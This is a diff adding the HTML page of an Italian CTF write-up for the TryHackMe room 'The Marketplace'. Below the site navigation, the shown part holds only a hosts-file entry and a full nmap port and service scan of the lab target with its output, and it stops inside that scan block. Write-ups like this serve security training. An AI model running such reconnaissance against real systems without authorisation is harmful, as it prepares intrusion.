@@ -1,0 +1,1539 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF Writeup per The Marketplace (TryHackMe)">
+      
+      
+        <meta name="author" content="favmatteo">
+      
+      
+        <link rel="canonical" href="https://favmatteo.github.io/ctf-writeups/writeups/the-marketplace/">
+      
+      
+        <link rel="prev" href="../the-blob-blog/">
+      
+      
+        <link rel="next" href="../tomghost/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
+    
+    
+      
+        <title>The Marketplace - [!] ROOT@TERMINAL:~$ CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.57a0d79d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.fb2fffe2.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#the-marketplace" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="[!] ROOT@TERMINAL:~$ CTF Writeups" class="md-header__button md-logo" aria-label="[!] ROOT@TERMINAL:~$ CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            [!] ROOT@TERMINAL:~$ CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              The Marketplace
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/favmatteo/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    favmatteo/ctf-writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="[!] ROOT@TERMINAL:~$ CTF Writeups" class="md-nav__button md-logo" aria-label="[!] ROOT@TERMINAL:~$ CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    [!] ROOT@TERMINAL:~$ CTF Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/favmatteo/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    favmatteo/ctf-writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups CTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-linux-infiltrate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web & Linux - Infiltrate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-privesc-kernel-suid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux - Kernel & SUID PrivEsc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archivio Notion
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archivio Notion
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../0day/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0day
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../incompleto-paperwork/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [INCOMPLETO] PaperWork
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../agent-sudo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent Sudo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../billing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Billing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../convertmyvideo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ConvertMyVideo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dogcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    dogcat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gamingserver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GamingServer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../jump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Jump
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mr-robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mr Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mustacchio/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mustacchio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../operation-promotion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operation Promotion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overpass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass-3-hosting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overpass 3 - Hosting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pickle-rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pickle Rick
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../road/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Road
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../silver-platter/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silver Platter
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../support/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../the-blob-blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Blob Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Marketplace
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tomghost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tomghost
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tryheartme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHeartMe
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../watcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Watcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-jump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Jump
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="the-marketplace">The Marketplace<a class="headerlink" href="#the-marketplace" title="Permanent link">#</a></h1>
+<p><a href="https://tryhackme.com/room/marketplace?vccr=1">https://tryhackme.com/room/marketplace?vccr=1</a></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>kali@kali:~/Desktop/CTF/TheMarketplace$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"10.129.181.1 market.local"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</span></code></pre></div></td></tr></table></div>
+<p>Procediamo per iniziare a enumerare i servizi presenti nella macchina utilizzando <code>nmap</code> </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>kali@kali:~/Desktop/CTF/TheMarketplace$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span>market.local<span class="w"> </span>-oN<span class="w"> </span>nmap_result.txt
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.99<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-10-02<span class="w"> </span><span class="m">15</span>:05<span class="w"> </span>-0400
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>market.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.181.1<span class="o">)</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.087s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65532</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">06</span>:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.19.2
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a><span class="p">|</span>_http-title:<span class="w"> </span>The<span class="w"> </span>Marketplace
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.19.2
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry<span class="w"> </span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="p">|</span>_/admin
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="m">32768</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Node.js<span class="w"> </span><span class="o">(</span>Express<span class="w"> </span>middleware<span class="o">)</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="p">|</span>_http-title:<span class="w"> </span>The<span class="w"> </span>Marketplace
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry<span class="w"> </span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a><span class="p">|</span>_/admin
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
